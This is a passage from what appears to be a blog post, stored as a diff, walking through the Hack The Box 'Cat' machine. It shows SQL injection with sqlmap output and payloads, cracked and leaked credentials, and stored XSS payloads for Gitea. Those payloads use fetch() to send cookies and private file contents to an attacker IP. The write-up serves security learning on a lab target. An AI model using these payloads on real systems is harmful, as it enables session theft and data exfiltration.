class="variable">$_POST</span>[<span class="string">&#x27;catName&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$cat_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;catName&#x27;</span>]; <span class="comment">//vulnerable</span></span><br><span class="line">            <span class="variable">$catId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;catId&#x27;</span>];</span><br><span class="line">            <span class="variable">$sql_insert</span> = <span class="string">&quot;INSERT INTO accepted_cats (name) VALUES (&#x27;<span class="subst">$cat_name</span>&#x27;)&quot;</span>; <span class="comment">//vulnerable</span></span><br><span class="line">            <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql_insert</span>); <span class="comment">//vulnerable</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$stmt_delete</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;DELETE FROM cats WHERE cat_id = :cat_id&quot;</span>);</span><br><span class="line">            <span class="variable">$stmt_delete</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:cat_id&#x27;</span>, <span class="variable">$catId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">            <span class="variable">$stmt_delete</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;The cat has been accepted and added successfully.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Error: Cat ID or Cat Name not provided.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Access denied.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We’ll execute sqlmap on it and see what we get. The final payload will be like this:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/CAT]</span><br><span class="line">└─$ sqlmap -r accept_cat_request.txt --level 5 --risk 3 --tables --dump -p catName --dbms=sqlite </span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.8.7#stable&#125;</span></span><br><span class="line"><span class="string">|_ -| . [)]     | .&#x27;</span>| . |</span><br><span class="line">|___|_  [)]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 18:06:09 /2025-02-07/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[18:06:09] [INFO] parsing HTTP request from &#x27;</span>accept_cat_request.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:09] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[18:06:10] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[18:06:10] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[18:06:10] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[18:06:10] [WARNING] heuristic (basic) test shows that POST parameter &#x27;</span>catName<span class="string">&#x27; might not be injectable</span></span><br><span class="line"><span class="string">[18:06:11] [INFO] testing for SQL injection on POST parameter &#x27;</span>catName<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:11] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:26] [INFO] POST parameter &#x27;</span>catName<span class="string">&#x27; appears to be &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27; injectable (with --code=200)</span></span><br><span class="line"><span class="string">[18:06:26] [INFO] testing &#x27;</span>Generic inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:26] [INFO] testing &#x27;</span>SQLite inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:27] [INFO] testing &#x27;</span>SQLite &gt; 2.0 stacked queries (heavy query - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:27] [INFO] testing &#x27;</span>SQLite &gt; 2.0 stacked queries (heavy query)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:27] [INFO] testing &#x27;</span>SQLite &gt; 2.0 AND time-based blind (heavy query)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] POST parameter &#x27;</span>catName<span class="string">&#x27; appears to be &#x27;</span>SQLite &gt; 2.0 AND time-based blind (heavy query)<span class="string">&#x27; injectable </span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (random number) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 21 to 40 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (random number) - 21 to 40 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 41 to 60 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (random number) - 41 to 60 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 61 to 80 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (random number) - 61 to 80 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 81 to 100 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] testing &#x27;</span>Generic UNION query (random number) - 81 to 100 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] checking if the injection point on POST parameter &#x27;</span>catName<span class="string">&#x27; is a false positive</span></span><br><span class="line"><span class="string">POST parameter &#x27;</span>catName<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 84 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: catName (POST)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: catName=kujen&#x27;</span>||(SELECT CHAR(68,70,87,99) WHERE 7165=7165 AND 5623=5623)||<span class="string">&#x27;&amp;catId=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: SQLite &gt; 2.0 AND time-based blind (heavy query)</span></span><br><span class="line"><span class="string">    Payload: catName=kujen&#x27;</span>||(SELECT CHAR(89,69,69,121) WHERE 1538=1538 AND 9480=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||<span class="string">&#x27;&amp;catId=1</span></span><br><span class="line"><span class="string">---</span></span><br></pre></td></tr></table></figure></div>
+
+<p>We can retrieve rosa’s hash using it. Cracking it we get <code>rosa:soyunaprincesarosa</code>.<br>Also looking at this line in the source code:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;axel&#x27;</span>) &#123;</span><br><span class="line">    // If the logged <span class="keyword">in</span> user is admin</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;a href=&quot;/admin.php&quot;&gt;Admin&lt;/a&gt;&#x27;</span>; </span><br></pre></td></tr></table></figure></div>
+<p>We reckon that there is a axel user, so I check the apache logs on system and I end up finding the user’s credentials:<br><code>loginUsername=axel&amp;loginPassword=aNdZwgC4tI9gnVXv_e3Q</code></p>
+<p>We can now retrieve our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(axel) gid=1000(axel) <span class="built_in">groups</span>=1000(axel)</span><br><span class="line">axel@<span class="built_in">cat</span>:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">a4fec67382dd4b6d8959e4c33c080ab0</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Privilege-Escalation-XSS-in-Gitea"><a href="#Privilege-Escalation-XSS-in-Gitea" class="headerlink" title="Privilege Escalation - XSS in Gitea"></a>Privilege Escalation - XSS in Gitea</h2><p>Doing some system enumeration, we find a few mails:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:~$ <span class="built_in">cat</span> /var/mail/axel</span><br><span class="line">From rosa@cat.htb  Sat Sep 28 04:51:50 2024</span><br><span class="line">Return-Path: &lt;rosa@cat.htb&gt;</span><br><span class="line">Received: from cat.htb (localhost [127.0.0.1])</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP <span class="built_in">id</span> 48S4pnXk001592</span><br><span class="line">        <span class="keyword">for</span> &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 04:51:50 GMT</span><br><span class="line">Received: (from rosa@localhost)</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Submit) <span class="built_in">id</span> 48S4pnlT001591</span><br><span class="line">        <span class="keyword">for</span> axel@localhost; Sat, 28 Sep 2024 04:51:49 GMT</span><br><span class="line">Date: Sat, 28 Sep 2024 04:51:49 GMT</span><br><span class="line">From: rosa@cat.htb</span><br><span class="line">Message-Id: &lt;202409280451.48S4pnlT001591@cat.htb&gt;</span><br><span class="line">Subject: New <span class="built_in">cat</span> services</span><br><span class="line"></span><br><span class="line">Hi Axel,</span><br><span class="line"></span><br><span class="line">We are planning to launch new cat-related web services, including a <span class="built_in">cat</span> care website and other projects. Please send an email to jobert@localhost with information about your Gitea repository. Jobert will check <span class="keyword">if</span> it is a promising service that we can develop.</span><br><span class="line"></span><br><span class="line">Important note: Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.</span><br><span class="line"></span><br><span class="line">From rosa@cat.htb  Sat Sep 28 05:05:28 2024</span><br><span class="line">Return-Path: &lt;rosa@cat.htb&gt;</span><br><span class="line">Received: from cat.htb (localhost [127.0.0.1])</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Debian-18) with ESMTP <span class="built_in">id</span> 48S55SRY002268</span><br><span class="line">        <span class="keyword">for</span> &lt;axel@cat.htb&gt;; Sat, 28 Sep 2024 05:05:28 GMT</span><br><span class="line">Received: (from rosa@localhost)</span><br><span class="line">        by cat.htb (8.15.2/8.15.2/Submit) <span class="built_in">id</span> 48S55Sm0002267</span><br><span class="line">        <span class="keyword">for</span> axel@localhost; Sat, 28 Sep 2024 05:05:28 GMT</span><br><span class="line">Date: Sat, 28 Sep 2024 05:05:28 GMT</span><br><span class="line">From: rosa@cat.htb</span><br><span class="line">Message-Id: &lt;202409280505.48S55Sm0002267@cat.htb&gt;</span><br><span class="line">Subject: Employee management</span><br><span class="line"></span><br><span class="line">We are currently developing an employee management system. Each sector administrator will be assigned a specific role, <span class="keyword">while</span> each employee will be able to consult their assigned tasks. The project is still under development and is hosted <span class="keyword">in</span> our private Gitea. You can visit the repository at: http://localhost:3000/administrator/Employee-management/. In addition, you can consult the README file, highlighting updates and other important details, at: http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md.</span><br><span class="line"></span><br><span class="line">axel@<span class="built_in">cat</span>:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>It’s hinting for a gitea instance deployed on port 3000. So let’s forward that to our machine:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/CAT]</span><br><span class="line">└─$ ssh axel@cat.htb -L 3000:127.0.0.1:3000</span><br><span class="line">axel@cat.htb<span class="string">&#x27;s password: </span></span><br></pre></td></tr></table></figure></div>
+
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Cat/gitea.png"
+                      alt="Gitea"
+                ><figcaption>Gitea</figcaption></figure></p>
+<p>We can connect with axel creds.</p>
+<p>We can also see that the user Gitea version is 1.22 <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52077" >which is vulnerable to stored XSS <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> too.</p>
+<p>And remember from the email this sentence: <code>Be sure to include a clear description of the idea so that I can understand it properly. I will review the whole repository.</code></p>
+<p>So the payload should go in description.<br>Create repo named kujen &#x3D;&gt; settings &#x3D;&gt; put XSS payload inside “description” field:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;javascript:fetch(&#x27;http://10.10.16.39/?d=&#x27;+encodeURIComponent(btoa(document.cookie)));&quot;</span>&gt;<span class="variable constant_">XSS</span> test&lt;/a&gt;</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/kujen&quot;</span> | sendmail jobert@cat.htb</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that the size changes from 0 to 557:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">axel@<span class="built_in">cat</span>:/var/mail$ <span class="built_in">echo</span> -e <span class="string">&quot;Subject: Test Email\n\nHello, check repo http://localhost:3000/axel/kujen&quot;</span> | sendmail jobert@cat.htb</span><br><span class="line">axel@<span class="built_in">cat</span>:/var/mail$ ll</span><br><span class="line">total 64</span><br><span class="line">drwxrwsrwt  2 root   mail  4096 Feb  7 18:08 ./</span><br><span class="line">drwxr-xr-x 13 root   root  4096 Jun  6  2024 ../</span><br><span class="line">-rw-rw----  1 axel   mail  1961 Jan 14 16:49 axel</span><br><span class="line">-rw-rw----  1 jobert mail  557 Feb  7 18:08 jobert</span><br><span class="line">-rw-------  1 root   mail 43698 Feb  7 18:05 root</span><br><span class="line">axel@<span class="built_in">cat</span>:/var/mail$ </span><br></pre></td></tr></table></figure></div>
+
+<p>Again , i went to read the second mail , I remember they talked about private repo.<br>I tried to read the README.md file by using this payload and it works, but the contents are useles. So I went to read the index.php file:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:fetch(&quot;http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php&quot;).then(response=&gt;response.text()).then(data=&gt;fetch(&quot;http://10.10.16.39/?d=&quot;+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));&#x27;</span>&gt;<span class="variable constant_">XSS</span> test&lt;/a&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And after decrypting the contents, we get root creds:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$valid_username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$valid_password</span> = <span class="string">&#x27;IKw75eR0MR7CMIxhH0&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>]) || </span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_USER&#x27;</span>] != <span class="variable">$valid_username</span> || <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_AUTH_PW&#x27;</span>] != <span class="variable">$valid_password</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;WWW-Authenticate: Basic realm=&quot;Employee Management&quot;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.0 401 Unauthorized&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: dashboard.php&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>And we can now claim the root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@<span class="built_in">cat</span>:~<span class="comment"># cat root.txt</span></span><br><span class="line">833ef290e04e8671d056f663f8a35e17</span><br><span class="line">root@<span class="built_in">cat</span>:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Cat</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-07-04 14:57:59</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-04 15:41:38
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/07/04/Hackthebox-Cat/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/06/26/Hackthebox-Haze/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Haze</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Cat</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Directory-Bruteforcing"><span class="nav-text">Directory Bruteforcing</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-in-http-cat-htb"><span class="nav-text">XSS in http:&#x2F;&#x2F;cat.htb </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-XSS-in-Gitea"><span class="nav-text">Privilege Escalation - XSS in Gitea</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
